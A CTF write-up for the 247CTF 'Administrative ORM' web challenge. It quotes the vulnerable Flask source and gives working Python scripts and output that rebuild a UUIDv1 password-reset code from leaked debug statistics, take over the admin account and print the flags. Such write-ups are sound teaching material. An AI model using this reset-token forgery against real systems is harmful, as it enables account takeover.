# Web: Administrative ORM

## Previous Flag
```
247CTF{33cd0604f65815a9375e2da04e1b8610}
```

## Goal
We started building a custom ORM for user management. Can you find any bugs before we push to production?

## What I learned
```
ORM stands for Object-Relational Mapping.

It’s a programming technique that allows developers to interact with a relational database (like MySQL, PostgreSQL, or SQLite) using the object-oriented paradigm of their programming language — instead of writing raw SQL queries.

    sql                                                         python3
SELECT * FROM users WHERE id = 1;                           user = User.objects.get(id=1)

Plan:
    Use the statistics page to guess UUID
    Set custom password with guessed UUID
    Use password to obtain the flag
```

## Side Quest: Installing Python Library on restricted machine ❤️❤️❤️❤️❤️
```
Option A — Recommended: create a virtual environment (isolated, clean)
# create and activate a venv in the current directory
    python3 -m venv venv
    source venv/bin/activate

    # install packages inside the venv
    pip install --upgrade pip
    pip install pandas numpy requests

    # run your script while venv is active
    python pythonScript.py

    To stop using the venv: deactivate

Option B — Per-user install with pip (no venv) ❤️
Installs into your home directory (~/.local) — no sudo required. Ensure ~/.local/bin is in your PATH to use any console scripts
    # install packages into your user site-packages
    python3 -m pip install --user --upgrade pip
    python3 -m pip install --user pandas numpy requests

    # run script the normal way
    python3 pythonScript.py

    If you later need to run a console tool installed into ~/.local/bin, add to PATH:
    export PATH="$HOME/.local/bin:$PATH"

Option C — Install into a local folder and run with PYTHONPATH (if pip can't write site-packages)
Use this when you can't use venv or --user for some reason

    # create a local folder for packages
    mkdir -p ./local_lib
    python3 -m pip install --upgrade pip --target=./local_lib
    python3 -m pip install --target=./local_lib pandas numpy requests

    # run script with PYTHONPATH so Python finds those packages
    PYTHONPATH=./local_lib python3 pythonScript.py
```

## Solution
```
START CHALLENGE

import pymysql.cursors
import pymysql, os, bcrypt, debug
from flask import Flask, request
from secret import flag, secret_key, sql_user, sql_password, sql_database, sql_host

class ORM():
    def __init__(self):
        self.connection = pymysql.connect(host=sql_host, user=sql_user, password=sql_password, db=sql_database, cursorclass=pymysql.cursors.DictCursor)

    def update(self, sql, parameters):
        with self.connection.cursor() as cursor:
          cursor.execute(sql, parameters)
          self.connection.commit()

    def query(self, sql, parameters):
        with self.connection.cursor() as cursor:
          cursor.execute(sql, parameters)
          result = cursor.fetchone()
        return result

    def get_by_name(self, user):
        return self.query('select * from users where username=%s', user)

    def get_by_reset_code(self, reset_code):
        return self.query('select * from users where reset_code=%s', reset_code)

    def set_password(self, user, password):
        password_hash = bcrypt.hashpw(password, bcrypt.gensalt())
        self.update('update users set password=%s where username=%s', (password_hash, user))

    def set_reset_code(self, user):
        self.update('update users set reset_code=uuid() where username=%s', user)

app = Flask(__name__)
app.config['DEBUG'] = False
app.config['SECRET_KEY'] = secret_key
app.config['USER'] = 'admin'

@app.route("/get_flag") 👀
def get_flag():
    user_row = app.config['ORM'].get_by_name(app.config['USER'])
    if bcrypt.checkpw(request.args.get('password','').encode('utf8'), user_row['password'].encode('utf8')):
        return flag
    return "Invalid password for %s!" % app.config['USER']

@app.route("/update_password") 👀
def update_password():
    user_row = app.config['ORM'].get_by_reset_code(request.args.get('reset_code',''))
    if user_row:
        app.config['ORM'].set_password(app.config['USER'], request.args.get('password','').encode('utf8'))
        return "Password reset for %s!" % app.config['USER']
    app.config['ORM'].set_reset_code(app.config['USER'])
    return "Invalid reset code for %s!" % app.config['USER']

@app.route("/statistics") # TODO: remove statistics 👀👀👀👀👀
def statistics():
    return debug.statistics()

@app.route('/')
def source():
    return "%s" % open(__file__).read()

@app.before_first_request
def before_first():
    app.config['ORM'] = ORM()
    app.config['ORM'].set_password(app.config['USER'], os.urandom(32).hex())

@app.errorhandler(Exception)
def error(error):
    return "Something went wrong!"

if __name__ == "__main__":
    app.run()

Browser: https://c61c17b0a88fca76.247ctf.com/get_flag ⌨️
Invalid password for admin!

# Method 1:
# Create a payload from def uuid1 from https://github.com/python/cpython/blob/df8913f7c48d267efd662e8ffd9496595115eee8/Lib/uuid.py
AsianHacker-picoctf@webshell:~$ vi pythonScript.py ⌨️
AsianHacker-picoctf@webshell:~$ cat pythonScript.py ⌨️
#!/usr/bin/env python3

import uuid                         # used to construct UUID objects from fields
import requests                     # for making HTTP requests to the target service
import pandas as pd                 # for datetime parsing / timestamp conversion
import numpy as np                  # for numpy timedelta64 objects used in time calculations

# Set URL to challenge
URL="https://c61c17b0a88fca76.247ctf.com/"

# Arbitrary password
password = "1234"

def str_to_ns(time_str):
     # Convert an "HH:MM:SS.sssssss..." time string into a total numpy timedelta64 sum (nanoseconds)
     # Splits into hours, minutes and seconds.fraction, then builds timedelta64 objects for each
     h, m, s = time_str.split(":")
     int_s, ns = s.split(".")
     ns = map(lambda t, unit: np.timedelta64(t, unit),
              [h,m,int_s,ns.ljust(9, '0')],['h','m','s','ns'])
     return sum(ns)

# return MAC address as int
def parse_mac(mac):
    # Remove colons and parse hex MAC into integer (node field for UUID v1)
    return int(mac.replace(':', ''), 16)

# Modified uuid1() from python uuid library
def uuid1(node, clock_seq, ts):
    # Build a UUID version 1 from the provided node (MAC as int), clock sequence, and timestamp (ts)
    # ts is expected in *nanoseconds* since epoch-like base; function converts to UUID's 100-ns ticks
    timestamp = ts // 100 + 0x01b21dd213814000
    time_low = timestamp & 0xffffffff
    time_mid = (timestamp >> 32) & 0xffff
    time_hi_version = (timestamp >> 48) & 0x0fff
    clock_seq_low = clock_seq & 0xff
    # Variant bits: keep only 6 bits then later pack into fields passed to UUID
    clock_seq_hi_variant = (clock_seq >> 8) & 0x3f
    return uuid.UUID(fields=(time_low, time_mid, time_hi_version,
                        clock_seq_hi_variant, clock_seq_low, node), version=1)

def generate_uuid():
    # Query the target /statistics endpoint to extract information needed to recreate the reset UUID
    r = requests.get(URL+'/statistics')
    out = r.text.split()
    # The script expects mac, last date/time, and clock sequence at specific word offsets in the response
    mac = out[6]
    ldate = out[50]
    ltime = out[51]
    clock_sequence = out[42]

    print ()
    print ("MAC              : "+mac)
    print ("Clock sequence   : "+str(clock_sequence))
    print ("Last reset       : "+ldate,ltime)

    # Pandas Timestamp.timestamp() function does not return nanoseconds.
    # https://github.com/pandas-dev/pandas/issues/29461
    # So we split this part.
    # Convert the date (YYYY-MM-DD) to seconds since epoch, then to nanoseconds
    nseconds = pd.to_datetime(ldate, format='%Y-%m-%d').timestamp() * 1000 * 1000 * 1000
    # Add the missing nanoseconds from the time-of-day string to have exact result
    time_in_ns = str_to_ns(ltime)+int(nseconds)

    # Recreate the UUID using the parsed MAC (node), clock sequence, and calculated timestamp
    UUID = uuid1(parse_mac(mac), int(clock_sequence), int(time_in_ns))

    # Print UUID internals for debugging / verification
    print('UUID.time        :', UUID.time)
    print('UUID.clock_seq   :', UUID.clock_seq)
    print('UUID.node        :', UUID.node)
    print("UUID generated is:", UUID)

    return str(UUID)

print ("Exploiting Web / Administrative ORM @ 247ctf.com")

# Step 1: Request a reset to make the server generate and display a reset code in /statistics
r = requests.get(URL+'/reset')
print ()
print ("-> requests.get("+URL+"/reset)")
print (r.text)

# Step 2: Use generate_uuid() to reconstruct the UUID that the server generated (guessed reset code)
guessed_uuid = generate_uuid()

# Step 3: Call update_password with the guessed reset_code UUID and a new password
r = requests.get(URL+'/update_password?reset_code='+guessed_uuid+'&password='+password)
print ()
print ("-> requests.get("+URL+"/update_password?reset_code="+guessed_uuid+"&password="+password+")")
print (r.text)

# Step 4: Retrieve the flag using the new password if the reset/password update succeeded
r = requests.get(URL+'/get_flag?password='+password)
print ()
print ("-> requests.get("+URL+"/get_flag?password="+password+")")
print (r.text)

AsianHacker-picoctf@webshell:~$ ./pythonScript.py ⌨️
Traceback (most recent call last):
  File "/home/AsianHacker-picoctf/./pythonScript.py", line 5, in <module>
    import pandas as pd
ModuleNotFoundError: No module named 'pandas' ⚠️

# create and activate a venv in the current directory
AsianHacker-picoctf@webshell:~$ python3 -m venv venv ⌨️
The virtual environment was not created successfully because ensurepip is not
available.  On Debian/Ubuntu systems, you need to install the python3-venv ⚠️
package using the following command.

    apt install python3.10-venv

You may need to use sudo with that command.  After installing the python3-venv
package, recreate your virtual environment.

Failing command: /home/AsianHacker-picoctf/venv/bin/python3

AsianHacker-picoctf@webshell:~$ python3 -m pip install --user pandas numpy requests ⌨️❤️
Collecting pandas
  Downloading pandas-2.3.3-cp310-cp310-manylinux_2_24_x86_64.manylinux_2_28_x86_64.whl.metadata (91 kB)
Requirement already satisfied: numpy in /usr/local/lib/python3.10/dist-packages (2.2.3)
Requirement already satisfied: requests in /usr/local/lib/python3.10/dist-packages (2.32.3)
Requirement already satisfied: python-dateutil>=2.8.2 in /usr/local/lib/python3.10/dist-packages (from pandas) (2.9.0.post0)
Requirement already satisfied: pytz>=2020.1 in /usr/lib/python3/dist-packages (from pandas) (2022.1)
Collecting tzdata>=2022.7 (from pandas)
  Downloading tzdata-2025.2-py2.py3-none-any.whl.metadata (1.4 kB)
Requirement already satisfied: charset-normalizer<4,>=2 in /usr/local/lib/python3.10/dist-packages (from requests) (3.4.1)
Requirement already satisfied: idna<4,>=2.5 in /usr/local/lib/python3.10/dist-packages (from requests) (3.10)
Requirement already satisfied: urllib3<3,>=1.21.1 in /usr/local/lib/python3.10/dist-packages (from requests) (2.3.0)
Requirement already satisfied: certifi>=2017.4.17 in /usr/local/lib/python3.10/dist-packages (from requests) (2025.1.31)
Requirement already satisfied: six>=1.5 in /usr/local/lib/python3.10/dist-packages (from python-dateutil>=2.8.2->pandas) (1.17.0)
Downloading pandas-2.3.3-cp310-cp310-manylinux_2_24_x86_64.manylinux_2_28_x86_64.whl (12.8 MB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 12.8/12.8 MB 1.9 MB/s eta 0:00:00
Downloading tzdata-2025.2-py2.py3-none-any.whl (347 kB)
WARNING: Error parsing dependencies of send2trash: Expected matching RIGHT_PARENTHESIS for LEFT_PARENTHESIS, after version specifier
    sys-platform (=="darwin") ; extra == 'objc'
                 ~^
Installing collected packages: tzdata, pandas
Successfully installed pandas-2.3.3 tzdata-2025.2

[notice] A new release of pip is available: 25.0.1 -> 25.2
[notice] To update, run: python3 -m pip install --upgrade pip

# Tried Again and worked for some reason
AsianHacker-picoctf@webshell:~$ ./pythonScript.py ⌨️
Exploiting Web / Administrative ORM @ 247ctf.com

-> requests.get(https://c61c17b0a88fca76.247ctf.com//reset)
Something went wrong!

MAC              : 02:42:AC:11:00:04
Clock sequence   : 5248
Last reset       : 2025-10-10 22:19:56.847193300
UUID.time        : 139794275968471933
UUID.clock_seq   : 5248
UUID.node        : 2485377892356
UUID generated is: 40bbd37d-a627-11f0-9480-0242ac110004 👀

-> requests.get(https://c61c17b0a88fca76.247ctf.com//update_password?reset_code=40bbd37d-a627-11f0-9480-0242ac110004&password=1234) 👀
Password reset for admin!

-> requests.get(https://c61c17b0a88fca76.247ctf.com//get_flag?password=1234) 👀
247CTF{aff83b946e64e299a08f50b8ba0161ff} 🔐

Method 2:
Browser: https://c61c17b0a88fca76.247ctf.com/statistics ⌨️
Interface statistics:
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:04  
          inet addr:172.17.0.4  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:21370 errors:0 dropped:0 overruns:0 frame:0
          TX packets:14252 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:2593412 (2.4 MiB)  TX bytes:1850537 (1.7 MiB)

Database statistics:
	clock_sequence: 5248
	delete_latency: 0
	fetch_latency: 231422036524
	insert_latency: 0
	last_reset: 2025-10-10 22:19:56.847193300
	rows_deleted: 0
	rows_fetched: 14068
	rows_inserted: 0
	rows_updated: 3511
	total_latency: 399924360052
	update_latency: 168502323528

# Calculate UUID reset_code
AsianHacker-picoctf@webshell:~$ vi calculateUUID.py ⌨️
AsianHacker-picoctf@webshell:~$ cat calculateUUID.py ⌨️
#!/usr/bin/python3

import uuid
import pandas as pd
import numpy as np

def parse_mac(mac):
    return int(mac.replace(':', ''), 16)

def str_to_ns(time_str):
    h, m, s = time_str.split(":")
    int_s, ns = s.split(".")
    ns = ns.ljust(9, '0')  # pad to nanoseconds
    ns = int(ns)
    return (int(h)*3600 + int(m)*60 + int(int_s)) * 1_000_000_000 + ns

def uuid1_custom(node, clock_seq, ts):
    time_low = ts & 0xFFFFFFFF
    time_mid = (ts >> 32) & 0xFFFF
    time_hi_version = ((ts >> 48) & 0x0FFF) | (1 << 12)  # version 1

    clock_seq_low = clock_seq & 0xFF
    clock_seq_hi_variant = ((clock_seq >> 8) & 0x3F) | 0x80  # RFC 4122 variant

    return uuid.UUID(fields=(time_low, time_mid, time_hi_version,
                             clock_seq_hi_variant, clock_seq_low, node), version=1)

# Data from statistics page
mac_str = "02:42:AC:11:00:04"
clock_seq = 5248
last_reset_date = "2025-10-10"
last_reset_time = "22:19:56.847193300"

# Convert MAC to int
node = parse_mac(mac_str)

# Convert last_reset datetime to timestamp in nanoseconds since Unix epoch
nseconds = pd.to_datetime(last_reset_date).timestamp() * 1_000_000_000

# Add time part in nanoseconds
time_in_ns = int(nseconds) + str_to_ns(last_reset_time)

# UUID timestamp is 100-ns intervals since UUID epoch (1582-10-15)
UUID_EPOCH_START = 0x01b21dd213814000
ts_100ns = (time_in_ns // 100) + UUID_EPOCH_START

# Generate UUID
calculated_uuid = uuid1_custom(node, clock_seq, ts_100ns)
print("CALCULATED_UUID:", str(calculated_uuid))

AsianHacker-picoctf@webshell:~$ chmod u+x calculateUUID.py ⌨️
AsianHacker-picoctf@webshell:~$ ./calculateUUID.py ⌨️
CALCULATED_UUID: 40bbd37d-a627-11f0-9480-0242ac110004 👀

# Reset Password from Browser
Browser: https://c61c17b0a88fca76.247ctf.com/update_password?reset_code=40bbd37d-a627-11f0-9480-0242ac110004&password=1234 ⌨️
Password reset for admin!

# Get Flag from Browser
Browser: https://c61c17b0a88fca76.247ctf.com/get_flag?password=1234 ⌨️
247CTF{aff83b946e64e299a08f50b8ba0161ff} 🔐
```

## Flag
247CTF{aff83b946e64e299a08f50b8ba0161ff}

## Continue
[Continue](../247ctf/WebTheFlagApiKey.md)